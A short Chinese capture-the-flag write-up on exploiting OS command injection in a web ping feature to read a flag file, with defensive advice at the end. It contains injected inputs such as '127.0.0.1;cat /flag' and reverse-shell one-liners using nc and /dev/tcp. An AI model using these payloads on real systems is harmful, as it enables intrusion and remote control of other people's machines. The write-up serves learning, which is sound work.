思路：页面有个 ping 功能，输入 IP 会被拼进系统命令执行。用分号、管道、&& 这类 shell 连接符就能在后面追加自己的命令。

问题：
1. 不确定输入是不是真的进了 shell。
2. 试了 ;ls 没反应，不知道是过滤还是语法问题。
3. 不清楚命令的输出会不会回显。

解决：
1. 先测回显：输入 127.0.0.1;ls，如果页面上出现了目录列表，说明注入成立且回显正常。
2. 换成 127.0.0.1;cat /flag 之类的读文件命令，找目标位置。
3. 找到后直接输出内容，提交通过。

补充：
1. 命令连接符：分号（顺序执行）、&&（前一条成功才执行）、||（前一条失败才执行）、|（管道）、&（后台）。
2. 能执行命令意味着能反弹 shell：nc -e /bin/bash 或者 bash -i >& /dev/tcp/ip/port 0>&1。
3. 防御：绝对不要拼接 shell 命令，用参数化的系统调用，并对输入做白名单（比如只允许 IP 格式）。

工具：浏览器、Burp Suite、nc

踩坑记录：
1. 一开始用 && 但前面的 ping 因为网络不通失败了，导致后面的命令不执行，换成 ; 就好了。
2. 路径猜错，flag 不在 /flag 而在某个目录下，用 find 定位花了点时间。
3. 命令里有空格，URL 里直接写会被截断，得编码成 %20 或 +。

总结：命令注入和 SQL 注入是同一个病根：把用户输入当代码。区别在于一个进数据库、一个进 shell。理解 shell 的连接符和管道，是玩转这类题的基础。
